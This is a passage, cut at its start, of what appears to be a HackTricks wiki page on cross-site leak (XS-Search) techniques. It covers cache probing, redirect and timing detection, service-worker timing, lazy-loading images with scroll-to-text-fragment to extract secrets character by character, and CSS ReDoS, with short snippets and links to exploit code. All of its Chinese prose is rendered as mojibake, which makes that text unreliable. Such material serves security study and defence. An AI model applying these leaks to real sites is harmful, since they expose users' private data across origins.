æ­¤ç¼“å­˜ä¸èƒ½å…±äº«ã€‚æ‚¨å¯ä»¥åœ¨è¿™é‡Œæ‰¾åˆ°æ›´å¤šç»†èŠ‚ï¼š[é€šè¿‡åˆ†åŒºç¼“å­˜è·å¾—å®‰å…¨æ€§å’Œéšç§](https://developer.chrome.com/blog/http-cache-partitioning/)\
ï¼ˆæ¥è‡ª [**è¿™é‡Œ**](https://blog.huli.tw/2022/05/05/en/angstrom-ctf-2022-writeup-en/) çš„è¯„è®ºï¼‰
{% endhint %}

å¦‚æœä¸€ä¸ªç«™ç‚¹ `example.com` åŒ…å«æ¥è‡ª `*.example.com/resource` çš„èµ„æºï¼Œé‚£ä¹ˆè¯¥èµ„æºå°†å…·æœ‰ä¸é€šè¿‡é¡¶çº§å¯¼èˆªç›´æ¥ **è¯·æ±‚** è¯¥èµ„æºæ—¶ **ç›¸åŒçš„ç¼“å­˜é”®**ã€‚è¿™æ˜¯å› ä¸ºç¼“å­˜é”®ç”±é¡¶çº§ _eTLD+1_ å’Œæ¡†æ¶ _eTLD+1_ ç»„æˆã€‚

å› ä¸ºè®¿é—®ç¼“å­˜æ¯”åŠ è½½èµ„æºæ›´å¿«ï¼Œæ‰€ä»¥å¯ä»¥å°è¯•æ›´æ”¹é¡µé¢çš„ä½ç½®å¹¶åœ¨ 20 æ¯«ç§’ï¼ˆä¾‹å¦‚ï¼‰åå–æ¶ˆå®ƒã€‚å¦‚æœåœ¨åœæ­¢åæ›´æ”¹äº†æºï¼Œåˆ™æ„å‘³ç€èµ„æºå·²è¢«ç¼“å­˜ã€‚\
æˆ–è€…å¯ä»¥ **å‘æ½œåœ¨ç¼“å­˜é¡µé¢å‘é€ä¸€äº› fetch å¹¶æµ‹é‡æ‰€éœ€æ—¶é—´**ã€‚

### Manual Redirect <a href="#fetch-with-abortcontroller" id="fetch-with-abortcontroller"></a>

* **Inclusion Methods**: Fetch API
* **Detectable Difference**: Redirects
* **More info**: [ttps://docs.google.com/presentation/d/1rlnxXUYHY9CHgCMckZsCGH4VopLo4DYMvAcOltma0og/edit#slide=id.gae7bf0b4f7\_0\_1234](https://docs.google.com/presentation/d/1rlnxXUYHY9CHgCMckZsCGH4VopLo4DYMvAcOltma0og/edit#slide=id.gae7bf0b4f7\_0\_1234)
* **Summary:** å¯ä»¥æ‰¾å‡º fetch è¯·æ±‚çš„å“åº”æ˜¯å¦ä¸ºé‡å®šå‘
* **Code Example**:

![](<../../.gitbook/assets/image (769).png>)

### Fetch with AbortController <a href="#fetch-with-abortcontroller" id="fetch-with-abortcontroller"></a>

* **Inclusion Methods**: Fetch API
* **Detectable Difference**: Timing
* **More info**: [https://xsleaks.dev/docs/attacks/cache-probing/#fetch-with-abortcontroller](https://xsleaks.dev/docs/attacks/cache-probing/#fetch-with-abortcontroller)
* **Summary:** å¯ä»¥å°è¯•åŠ è½½èµ„æºå¹¶åœ¨åŠ è½½ä¹‹å‰ä¸­æ–­åŠ è½½ã€‚æ ¹æ®æ˜¯å¦è§¦å‘é”™è¯¯ï¼Œèµ„æºå¯èƒ½å·²è¢«ç¼“å­˜æˆ–æœªè¢«ç¼“å­˜ã€‚
* **Code Example**: [https://xsleaks.dev/docs/attacks/cache-probing/#fetch-with-abortcontroller](https://xsleaks.dev/docs/attacks/cache-probing/#fetch-with-abortcontroller)

ä½¿ç”¨ _**fetch**_ å’Œ _**setTimeout**_ ç»“åˆ **AbortController** æ¥æ£€æµ‹ **èµ„æºæ˜¯å¦è¢«ç¼“å­˜** å¹¶å°†ç‰¹å®šèµ„æºä»æµè§ˆå™¨ç¼“å­˜ä¸­é©±é€ã€‚æ­¤å¤–ï¼Œè¯¥è¿‡ç¨‹åœ¨ä¸ç¼“å­˜æ–°å†…å®¹çš„æƒ…å†µä¸‹è¿›è¡Œã€‚

### Script Pollution

* **Inclusion Methods**: HTML Elements (script)
* **Detectable Difference**: Page Content
* **More info**: [https://xsleaks.dev/docs/attacks/element-leaks/#script-tag](https://xsleaks.dev/docs/attacks/element-leaks/#script-tag)
* **Summary:** å¯ä»¥ **è¦†ç›–å†…ç½®å‡½æ•°** å¹¶è¯»å–å…¶å‚æ•°ï¼Œå³ä½¿æ˜¯æ¥è‡ª **è·¨åŸŸè„šæœ¬**ï¼ˆæ— æ³•ç›´æ¥è¯»å–ï¼‰ï¼Œè¿™å¯èƒ½ **æ³„éœ²æœ‰ä»·å€¼çš„ä¿¡æ¯**ã€‚
* **Code Example**: [https://xsleaks.dev/docs/attacks/element-leaks/#script-tag](https://xsleaks.dev/docs/attacks/element-leaks/#script-tag)

### Service Workers <a href="#service-workers" id="service-workers"></a>

* **Inclusion Methods**: Pop-ups
* **Detectable Difference**: Page Content
* **More info**: [https://xsleaks.dev/docs/attacks/timing-attacks/execution-timing/#service-workers](https://xsleaks.dev/docs/attacks/timing-attacks/execution-timing/#service-workers)
* **Summary:** æµ‹é‡ä½¿ç”¨æœåŠ¡å·¥ä½œè€…çš„ç½‘é¡µçš„æ‰§è¡Œæ—¶é—´ã€‚
* **Code Example**:

åœ¨ç»™å®šçš„åœºæ™¯ä¸­ï¼Œæ”»å‡»è€…ä¸»åŠ¨åœ¨å…¶åŸŸåä¹‹ä¸€ "attacker.com" ä¸­æ³¨å†Œä¸€ä¸ª **æœåŠ¡å·¥ä½œè€…**ã€‚æ¥ä¸‹æ¥ï¼Œæ”»å‡»è€…ä»ä¸»æ–‡æ¡£ä¸­åœ¨ç›®æ ‡ç½‘ç«™æ‰“å¼€ä¸€ä¸ªæ–°çª—å£ï¼Œå¹¶æŒ‡ç¤º **æœåŠ¡å·¥ä½œè€…** å¼€å§‹è®¡æ—¶å™¨ã€‚å½“æ–°çª—å£å¼€å§‹åŠ è½½æ—¶ï¼Œæ”»å‡»è€…å°†å‰ä¸€æ­¥è·å¾—çš„å¼•ç”¨å¯¼èˆªåˆ°ç”± **æœåŠ¡å·¥ä½œè€…** ç®¡ç†çš„é¡µé¢ã€‚

åœ¨å‰ä¸€æ­¥å‘èµ·çš„è¯·æ±‚åˆ°è¾¾æ—¶ï¼Œ**æœåŠ¡å·¥ä½œè€…** ä»¥ **204 (No Content)** çŠ¶æ€ç å“åº”ï¼Œæœ‰æ•ˆåœ°ç»ˆæ­¢å¯¼èˆªè¿‡ç¨‹ã€‚æ­¤æ—¶ï¼Œ**æœåŠ¡å·¥ä½œè€…** æ•è·ä»ç¬¬äºŒæ­¥å¼€å§‹çš„è®¡æ—¶å™¨çš„æµ‹é‡ã€‚è¯¥æµ‹é‡å— JavaScript å¯¼è‡´çš„å¯¼èˆªè¿‡ç¨‹å»¶è¿Ÿçš„å½±å“ã€‚

{% hint style="warning" %}
åœ¨æ‰§è¡Œè®¡æ—¶ä¸­ï¼Œå¯ä»¥ **æ¶ˆé™¤** **ç½‘ç»œå› ç´ ** ä»¥è·å¾— **æ›´ç²¾ç¡®çš„æµ‹é‡**ã€‚ä¾‹å¦‚ï¼Œé€šè¿‡åœ¨åŠ è½½é¡µé¢ä¹‹å‰åŠ è½½é¡µé¢ä½¿ç”¨çš„èµ„æºã€‚
{% endhint %}

### Fetch Timing

* **Inclusion Methods**: Fetch API
* **Detectable Difference**: Timing (generally due to Page Content, Status Code)
* **More info**: [https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#modern-web-timing-attacks](https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#modern-web-timing-attacks)
* **Summary:** ä½¿ç”¨ [performance.now()](https://xsleaks.dev/docs/attacks/timing-attacks/clocks/#performancenow) æµ‹é‡æ‰§è¡Œè¯·æ±‚æ‰€éœ€çš„æ—¶é—´ã€‚å¯ä»¥ä½¿ç”¨å…¶ä»–æ—¶é’Ÿã€‚
* **Code Example**: [https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#modern-web-timing-attacks](https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#modern-web-timing-attacks)

### Cross-Window Timing

* **Inclusion Methods**: Pop-ups
* **Detectable Difference**: Timing (generally due to Page Content, Status Code)
* **More info**: [https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#cross-window-timing-attacks](https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#cross-window-timing-attacks)
* **Summary:** ä½¿ç”¨ [performance.now()](https://xsleaks.dev/docs/attacks/timing-attacks/clocks/#performancenow) æµ‹é‡ä½¿ç”¨ `window.open` æ‰§è¡Œè¯·æ±‚æ‰€éœ€çš„æ—¶é—´ã€‚å¯ä»¥ä½¿ç”¨å…¶ä»–æ—¶é’Ÿã€‚
* **Code Example**: [https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#cross-window-timing-attacks](https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#cross-window-timing-attacks)

<figure><img src="../../.gitbook/assets/image (48).png" alt=""><figcaption></figcaption></figure>

\
ä½¿ç”¨ [**Trickest**](https://trickest.com/?utm_source=hacktricks&utm_medium=text&utm_campaign=ppc&utm_content=xs-search) è½»æ¾æ„å»ºå’Œ **è‡ªåŠ¨åŒ–å·¥ä½œæµ**ï¼Œç”±ä¸–ç•Œä¸Š **æœ€å…ˆè¿›** çš„ç¤¾åŒºå·¥å…·æä¾›æ”¯æŒã€‚\
ç«‹å³è·å–è®¿é—®æƒé™ï¼š

{% embed url="https://trickest.com/?utm_source=hacktricks&utm_medium=banner&utm_campaign=ppc&utm_content=xs-search" %}

## With HTML or Re Injection

åœ¨è¿™é‡Œï¼Œæ‚¨å¯ä»¥æ‰¾åˆ°ä»è·¨åŸŸ HTML **æ³¨å…¥ HTML å†…å®¹** ä¸­æå–ä¿¡æ¯çš„æŠ€æœ¯ã€‚è¿™äº›æŠ€æœ¯åœ¨æ‚¨å‡ºäºä»»ä½•åŸå› å¯ä»¥ **æ³¨å…¥ HTML ä½†æ— æ³•æ³¨å…¥ JS ä»£ç ** çš„æƒ…å†µä¸‹å¾ˆæœ‰è¶£ã€‚

### Dangling Markup

{% content-ref url="../dangling-markup-html-scriptless-injection/" %}
[dangling-markup-html-scriptless-injection](../dangling-markup-html-scriptless-injection/)
{% endcontent-ref %}

### Image Lazy Loading

å¦‚æœæ‚¨éœ€è¦ **æå–å†…å®¹** å¹¶ä¸”å¯ä»¥åœ¨ **ç§˜å¯†ä¹‹å‰æ·»åŠ  HTML**ï¼Œæ‚¨åº”è¯¥æ£€æŸ¥ **å¸¸è§çš„æ‚¬æŒ‚æ ‡è®°æŠ€æœ¯**ã€‚\
ä½†æ˜¯ï¼Œå¦‚æœå‡ºäºæŸç§åŸå› æ‚¨ **å¿…é¡»** é€ä¸ªå­—ç¬¦åœ°è¿›è¡Œï¼ˆä¹Ÿè®¸é€šä¿¡æ˜¯é€šè¿‡ç¼“å­˜å‘½ä¸­ï¼‰ï¼Œæ‚¨å¯ä»¥ä½¿ç”¨è¿™ä¸ªæŠ€å·§ã€‚

**å›¾åƒ** åœ¨ HTML ä¸­å…·æœ‰ä¸€ä¸ª "**loading**" å±æ€§ï¼Œå…¶å€¼å¯ä»¥æ˜¯ "**lazy**"ã€‚åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œå›¾åƒå°†åœ¨è¢«æŸ¥çœ‹æ—¶åŠ è½½ï¼Œè€Œä¸æ˜¯åœ¨é¡µé¢åŠ è½½æ—¶ï¼š
```html
<img src=/something loading=lazy >
```
å› æ­¤ï¼Œæ‚¨å¯ä»¥åšçš„æ˜¯**æ·»åŠ å¤§é‡åƒåœ¾å­—ç¬¦**ï¼ˆä¾‹å¦‚**æˆåƒä¸Šä¸‡çš„"W"**ï¼‰æ¥**å¡«å……ç½‘é¡µåœ¨ç§˜å¯†ä¹‹å‰ï¼Œæˆ–è€…æ·»åŠ ç±»ä¼¼**`<br><canvas height="1850px"></canvas><br>`**çš„å†…å®¹ã€‚**\
ç„¶åï¼Œå¦‚æœä¾‹å¦‚æˆ‘ä»¬çš„**æ³¨å…¥å‡ºç°åœ¨æ ‡å¿—ä¹‹å‰**ï¼Œ**å›¾åƒ**å°†ä¼š**åŠ è½½**ï¼Œä½†å¦‚æœå‡ºç°åœ¨**æ ‡å¿—ä¹‹å**ï¼Œæ ‡å¿— + åƒåœ¾å°†**é˜»æ­¢å…¶åŠ è½½**ï¼ˆæ‚¨éœ€è¦å°è¯•æ”¾ç½®å¤šå°‘åƒåœ¾ï¼‰ã€‚è¿™å°±æ˜¯åœ¨[**è¿™ç¯‡æ–‡ç« **](https://blog.huli.tw/2022/10/08/en/sekaictf2022-safelist-and-connection/)ä¸­å‘ç”Ÿçš„äº‹æƒ…ã€‚

å¦ä¸€ä¸ªé€‰é¡¹æ˜¯ä½¿ç”¨**scroll-to-text-fragment**ï¼Œå¦‚æœå…è®¸çš„è¯ï¼š

#### Scroll-to-text-fragment

ä½†æ˜¯ï¼Œæ‚¨å¯ä»¥è®©**æœºå™¨äººè®¿é—®é¡µé¢**ï¼Œä½¿ç”¨ç±»ä¼¼
```
#:~:text=SECR
```
æ‰€ä»¥ç½‘é¡µå°†æ˜¯è¿™æ ·çš„ï¼š**`https://victim.com/post.html#:~:text=SECR`**

å…¶ä¸­ post.html åŒ…å«æ”»å‡»è€…çš„åƒåœ¾å­—ç¬¦å’Œæ‡’åŠ è½½å›¾åƒï¼Œç„¶åæ·»åŠ æœºå™¨äººçš„ç§˜å¯†ã€‚

è¿™æ®µæ–‡æœ¬çš„ä½œç”¨æ˜¯è®©æœºå™¨äººè®¿é—®é¡µé¢ä¸­åŒ…å«æ–‡æœ¬ `SECR` çš„ä»»ä½•æ–‡æœ¬ã€‚ç”±äºè¯¥æ–‡æœ¬æ˜¯ç§˜å¯†ï¼Œå¹¶ä¸”å®ƒå°±åœ¨ **å›¾åƒä¸‹æ–¹**ï¼Œå› æ­¤ **åªæœ‰åœ¨çŒœæµ‹çš„ç§˜å¯†æ­£ç¡®æ—¶ï¼Œå›¾åƒæ‰ä¼šåŠ è½½**ã€‚æ‰€ä»¥ä½ å°±æœ‰äº†ä½ çš„ç¥è°•æ¥ **é€å­—ç¬¦æå–ç§˜å¯†**ã€‚

ä¸€äº›åˆ©ç”¨æ­¤æ¼æ´çš„ä»£ç ç¤ºä¾‹ï¼š[https://gist.github.com/jorgectf/993d02bdadb5313f48cf1dc92a7af87e](https://gist.github.com/jorgectf/993d02bdadb5313f48cf1dc92a7af87e)

### åŸºäºå›¾åƒæ‡’åŠ è½½æ—¶é—´

å¦‚æœ **æ— æ³•åŠ è½½å¤–éƒ¨å›¾åƒ**ï¼Œè¿™å¯èƒ½ä¼šå‘æ”»å‡»è€…æŒ‡ç¤ºå›¾åƒå·²åŠ è½½ï¼Œå¦ä¸€ç§é€‰æ‹©æ˜¯å°è¯• **å¤šæ¬¡çŒœæµ‹å­—ç¬¦å¹¶æµ‹é‡**ã€‚å¦‚æœå›¾åƒåŠ è½½ï¼Œæ‰€æœ‰è¯·æ±‚çš„æ—¶é—´å°†æ¯”å›¾åƒæœªåŠ è½½æ—¶æ›´é•¿ã€‚è¿™å°±æ˜¯åœ¨ [**æ­¤å†™ä½œçš„è§£å†³æ–¹æ¡ˆä¸­**](https://blog.huli.tw/2022/10/08/en/sekaictf2022-safelist-and-connection/) **æ€»ç»“çš„å†…å®¹ï¼š**

{% content-ref url="event-loop-blocking-+-lazy-images.md" %}
[event-loop-blocking-+-lazy-images.md](event-loop-blocking-+-lazy-images.md)
{% endcontent-ref %}

### ReDoS

{% content-ref url="../regular-expression-denial-of-service-redos.md" %}
[regular-expression-denial-of-service-redos.md](../regular-expression-denial-of-service-redos.md)
{% endcontent-ref %}

### CSS ReDoS

å¦‚æœä½¿ç”¨ `jQuery(location.hash)`ï¼Œå¯ä»¥é€šè¿‡æ—¶é—´æ¥åˆ¤æ–­ **æ˜¯å¦å­˜åœ¨æŸäº› HTML å†…å®¹**ï¼Œè¿™æ˜¯å› ä¸ºå¦‚æœé€‰æ‹©å™¨ `main[id='site-main']` ä¸åŒ¹é…ï¼Œåˆ™ä¸éœ€è¦æ£€æŸ¥å…¶ä½™çš„ **é€‰æ‹©å™¨**ï¼š
```javascript
$("*:has(*:has(*:has(*)) *:has(*:has(*:has(*))) *:has(*:has(*:has(*)))) main[id='site-main']")
```
### CSS æ³¨å…¥

{% content-ref url="css-injection/" %}
[css-injection](css-injection/)
{% endcontent-ref %}

## é˜²å¾¡

åœ¨ [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) å’Œæ¯ä¸ª wiki éƒ¨åˆ† [https://xsleaks.dev/](https://xsleaks.dev/) ä¸­æ¨èäº†ä¸€äº›ç¼“è§£æªæ–½ã€‚è¯·æŸ¥çœ‹é‚£é‡Œä»¥è·å–æœ‰å…³å¦‚ä½•é˜²æ­¢è¿™äº›æŠ€æœ¯çš„æ›´å¤šä¿¡æ¯ã€‚

## å‚è€ƒ

* [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf)
* [https://xsleaks.dev/](https://xsleaks.dev)
* [https://github.com/xsleaks/xsleaks](https://github.com/xsleaks/xsleaks)
* [https://xsinator.com/](https://xsinator.com/)
* [https://github.com/ka0labs/ctf-writeups/tree/master/2019/nn9ed/x-oracle](https://github.com/ka0labs/ctf-writeups/tree/master/2019/nn9ed/x-oracle)

{% hint style="success" %}
å­¦ä¹ å’Œå®è·µ AWS é»‘å®¢æŠ€æœ¯ï¼š<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks åŸ¹è®­ AWS çº¢é˜Ÿä¸“å®¶ (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
å­¦ä¹ å’Œå®è·µ GCP é»‘å®¢æŠ€æœ¯ï¼š<img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks åŸ¹è®­ GCP çº¢é˜Ÿä¸“å®¶ (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>æ”¯æŒ HackTricks</summary>

* æŸ¥çœ‹ [**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)!
* **åŠ å…¥** ğŸ’¬ [**Discord ç¾¤ç»„**](https://discord.gg/hRep4RUj7f) æˆ– [**telegram ç¾¤ç»„**](https://t.me/peass) æˆ– **åœ¨** **Twitter** ğŸ¦ **ä¸Šå…³æ³¨æˆ‘ä»¬** [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **é€šè¿‡å‘** [**HackTricks**](https://github.com/carlospolop/hacktricks) å’Œ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github ä»“åº“æäº¤ PR æ¥åˆ†äº«é»‘å®¢æŠ€å·§ã€‚

</details>
{% endhint %}

<figure><img src="../../.gitbook/assets/image (48).png" alt=""><figcaption></figcaption></figure>

\
ä½¿ç”¨ [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) è½»æ¾æ„å»ºå’Œ **è‡ªåŠ¨åŒ–å·¥ä½œæµç¨‹**ï¼Œç”±ä¸–ç•Œä¸Š **æœ€å…ˆè¿›** çš„ç¤¾åŒºå·¥å…·æä¾›æ”¯æŒã€‚\
ä»Šå¤©å°±è·å–è®¿é—®æƒé™ï¼š

{% embed url="https://trickest.com/?utm_source=hacktricks&utm_medium=banner&utm_campaign=ppc&utm_content=xs-search" %}
